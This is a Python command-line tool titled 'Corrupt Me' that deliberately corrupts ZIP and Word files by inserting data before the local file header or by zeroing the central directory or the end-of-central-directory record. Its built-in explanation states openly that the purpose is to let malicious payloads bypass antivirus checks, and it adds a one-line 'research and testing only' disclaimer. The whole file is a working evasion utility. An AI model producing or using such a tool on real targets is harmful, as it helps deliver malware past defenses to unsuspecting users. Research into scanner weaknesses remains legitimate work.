import os
import sys
import pyfiglet

# Explanation for attackers' use of corrupted files
def show_explanation():
    print("\n" + "-" * 80)
    print("Attackers use corrupted files to bypass antivirus by exploiting how tools handle structural errors.")
    print("By tampering with headers, metadata, or archive components like the Central Directory,")
    print("they confuse detection systems, allowing malicious payloads to evade scanning.")
    print("-" * 80 + "\n")
    print("This tool will corrupt both word docs and zip files in a mostly recoverable fashion,")
    print("allowing your payload bypass AV checks. This tool is for research and testing purposes only")
    print("-" * 80 + "\n")

# Function to display a banner
def display_banner():
    banner = pyfiglet.figlet_format("Corrupt Me")
    print(banner)

def add_data_to_lfh(file_path, output_path, extra_data):
    with open(file_path, 'rb') as f:
        content = bytearray(f.read())
    
    lfh_signature = b'\x50\x4B\x03\x04'
    lfh_index = content.find(lfh_signature)
    
    if lfh_index == -1:
        print("LFH not found in the file!")
        return
    
    content = content[:lfh_index] + extra_data + content[lfh_index:]
    
    with open(output_path, 'wb') as f:
        f.write(content)
    print(f"Extra data added to the LFH. Saved as {output_path}.")

def zero_out_cdfh(file_path, output_path):
    with open(file_path, 'rb') as f:
        content = bytearray(f.read())
    
    cdfh_signature = b'\x50\x4B\x01\x02'
    cdfh_index = content.find(cdfh_signature)
    
    if cdfh_index == -1:
        print("CDFH not found in the file!")
        return
    
    eocd_signature = b'\x50\x4B\x05\x06'
    eocd_index = content.find(eocd_signature)
    
    if eocd_index == -1:
        print("EOCD not found in the file!")
        return
    
    cdfh_length = eocd_index - cdfh_index
    content[cdfh_index:cdfh_index + cdfh_length] = b'\x00' * cdfh_length
    
    with open(output_path, 'wb') as f:
        f.write(content)
    print(f"CDFH zeroed out. Saved as {output_path}.")

def zero_out_eocd_end(file_path, output_path, zero_length):
    with open(file_path, 'rb') as f:
        content = bytearray(f.read())
    
    eocd_signature = b'\x50\x4B\x05\x06'
    eocd_index = content.find(eocd_signature)
    
    if eocd_index == -1:
        print("EOCD not found in the file!")
        return
    
    eocd_length = len(content) - eocd_index
    zero_offset = max(0, eocd_length - zero_length)
    content[eocd_index + zero_offset:eocd_index + eocd_length] = b'\x00' * zero_length
    
    with open(output_path, 'wb') as f:
        f.write(content)
    print(f"EOCD partially zeroed out. Saved as {output_path}.")

def select_file():
    while True:
        file_path = input("Enter the full path to the file (Word or ZIP): ").strip()
        if os.path.isfile(file_path):
            return file_path
        else:
            print("File not found. Please try again.")

def display_menu():
    print("\nFile Corruption Menu:")
    print("1. Add extra data at the start of LFH")
    print("2. Zero out the entire CDFH")
    print("3. Zero out the end of EOCD")
    print("4. Exit")

def main():
    display_banner()
    show_explanation()
    while True:
        file_path = select_file()
        print(f"Selected file: {file_path}")
        while True:
            display_menu()
            choice = input("Select an option: ").strip()
            output_path = input("Enter the output file path: ").strip()

            if choice == '1':
                extra_data = input("Enter the extra data to add (default: 'EXTRA_DATA'): ").encode() or b"EXTRA_DATA"
                add_data_to_lfh(file_path, output_path, extra_data)
            elif choice == '2':
                zero_out_cdfh(file_path, output_path)
            elif choice == '3':
                zero_length = int(input("Enter the number of bytes to zero out at the end of EOCD: ").strip())
                zero_out_eocd_end(file_path, output_path, zero_length)
            elif choice == '4':
                print("Exiting program. Goodbye!")
                sys.exit()
            else:
                print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
